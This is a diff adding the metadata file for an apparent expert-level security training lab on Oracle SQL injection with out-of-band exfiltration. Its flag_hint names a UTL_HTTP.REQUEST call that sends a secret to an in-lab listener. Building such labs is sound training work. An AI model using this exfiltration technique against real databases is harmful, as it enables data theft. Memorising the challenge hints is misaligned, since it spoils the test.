@@ -1,0 +1,35 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "sqli-oob-dns-oracle-utlhttp",
+  "title": "Out-of-Band Exfiltration on Oracle via UTL_HTTP",
+  "track": "sqli",
+  "difficulty": "expert",
+  "estimated_minutes": 55,
+  "max_lifetime_minutes": 90,
+  "learning_objectives": [
+    "Recognise SQL injection in an Oracle-backed reporting endpoint (concatenated bind through a JDBC-style API)",
+    "Understand why in-band read is dead: the endpoint returns nothing on your payload, error text is scrubbed, and jitter kills the timing side channel",
+    "Chain the injection into an Oracle UTL_HTTP call that phones the exfil to a controlled listener the app never intended for you",
+    "Grant/consume network ACLs (DBMS_NETWORK_ACL_ADMIN) as an operational reality of Oracle 12c+/21c",
+    "Reason about egress-drop containment: the DB has no route off the host, so only the in-lab collector is reachable — the intended OOB channel"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-89", "CWE-918"],
+  "prerequisites": ["sqli-time-blind-mysql-sleep"],
+  "flag_hint": "Chain the SQLi into UTL_HTTP.REQUEST('http://oob:9000/<exfil>') to POST the secret to the in-lab collector, read what it captured via GET /oob/received (app-side proxy — the collector is on the DB's no-egress network), then POST /solve {\"secret\":\"<32 hex>\"} for the flag.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "python-oracledb 4.0 (thin mode)",
+    "Oracle Database 21c XE",
+    "OOB collector sidecar"
+  ],
+  "tags": ["sqli", "oob-exfil", "oracle", "utl_http", "network-acl", "heavy-tier", "cwe-89"],
+  "risk": "low",
+  "resource_tier": "heavy",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The classic Chris Anley Oracle OOB paper and the modern Vozec/GossiTheDog Oracle OOB write-ups — abstracted, no vendor code reused"
+}
